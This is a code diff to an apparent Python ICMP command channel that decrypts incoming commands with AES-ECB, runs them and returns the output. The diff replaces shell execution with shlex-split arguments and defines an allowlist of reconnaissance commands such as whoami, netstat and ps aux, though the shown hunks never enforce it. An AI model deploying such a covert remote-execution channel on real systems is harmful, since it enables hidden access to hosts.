@@ -1,6 +1,7 @@
 import hashlib
 import logging
 import os
+import shlex
 import socket
 import struct
 import subprocess
@@ -16,6 +17,13 @@ except ImportError:
     from logging_config import configure
 from Crypto.Util.Padding import pad, unpad
 
+ICMP_COMMAND_TIMEOUT = 5
+ALLOWED_ICMP_COMMANDS = frozenset({
+    "id", "whoami", "hostname", "uname -a", "ip addr", "ip route",
+    "ifconfig", "netstat -tlnp", "ps aux", "ls", "pwd", "cat /etc/hostname",
+    "exit",
+})
+
 
 # Verificar y relanzar con sudo si es necesario
 def check_sudo():
@@ -24,7 +32,8 @@ def check_sudo():
         args = ['sudo', sys.executable] + sys.argv
         os.execvpe('sudo', args, os.environ)
 
-check_sudo()
+if __name__ == "__main__":
+    check_sudo()
 def decrypt_data(data, key):
     cipher = AES.new(key, AES.MODE_ECB)
     return unpad(cipher.decrypt(data), AES.block_size)
@@ -35,12 +44,21 @@ def encrypt_data(data, key):
 
 def execute_command(command):
     try:
-        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=5)
+        parts = shlex.split(command)
+        if not parts:
+            return "Empty command"
+        result = subprocess.run(
+            parts,
+            shell=False,
+            capture_output=True,
+            text=True,
+            timeout=ICMP_COMMAND_TIMEOUT,
+        )
         return result.stdout if result.stdout else result.stderr
     except subprocess.TimeoutExpired:
-        return "Comando excedió el tiempo límite de 5 segundos"
+        return "Command exceeded timeout"
     except Exception as e:
-        return f"Error al ejecutar el comando: {str(e)}"
+        return f"Error executing command: {str(e)}"
 
 def send_icmp_reply(sock, addr, data, key):
     packet_id = os.getpid() & 0xFFFF
